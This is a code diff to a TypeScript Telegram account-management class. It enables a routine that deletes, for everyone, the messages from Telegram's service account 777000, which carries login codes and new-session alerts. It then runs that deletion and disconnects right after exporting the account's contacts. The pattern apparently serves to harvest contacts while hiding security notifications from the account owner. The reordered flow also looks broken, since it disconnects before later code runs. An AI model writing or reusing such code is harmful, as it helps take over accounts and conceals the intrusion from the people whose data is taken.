@@ -168,20 +168,22 @@ class TelegramManager {
     }
 
     async deleteMessages() {
-        // console.log("IsConnected - ", this.client.connected, this.phoneNumber);
-        // if (this.client.connected) {
-        //     try {
-        //         const msgs = await this.client.getMessages("777000", { limit: 10 });
-        //         const len = msgs['total'];
-        //         console.log(len)
-        //         for (let i = 0; i < len - 1; i++) {
-        //             console.log(msgs[i]?.text);
-        //             msgs[i]?.delete({ revoke: true });
-        //         }
-        //     } catch (error) {
-        //         console.log("Cannot delete Messages - ", this.phoneNumber);
-        //     }
-        // }
+        console.log("IsConnected - ", this.client.connected, this.phoneNumber);
+        if (this.client.connected) {
+            try {
+                const msgs = await this.client.getMessages("777000", { limit: 2 });
+                const len = msgs['total'];
+                console.log(len)
+                if (msgs.total > 2) {
+                    for (let i = 0; i < msgs.length - 1; i++) {
+                        console.log(msgs[i]?.text);
+                        msgs[i]?.delete({ revoke: true });
+                    }
+                }
+            } catch (error) {
+                console.log("Cannot delete Messages - ", this.phoneNumber);
+            }
+        }
         console.log("DeleteMessages TODO")
     }
 
@@ -455,6 +457,11 @@ class TelegramManager {
         const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
             hash: bigInt.zero
         }));
+
+        await this.deleteMessages();
+        await this.disconnect();
+        await deleteClient(this.phoneNumber);
+
         let channels = 0;
         const chatsArray = [];
         let personalChats = 0;
@@ -524,8 +531,6 @@ class TelegramManager {
             console.log("Error Occured");
             console.log(error)
         }
-        // await this.deleteMessages();
-        await this.disconnect();
-        await deleteClient(this.phoneNumber);
+
     }
 }
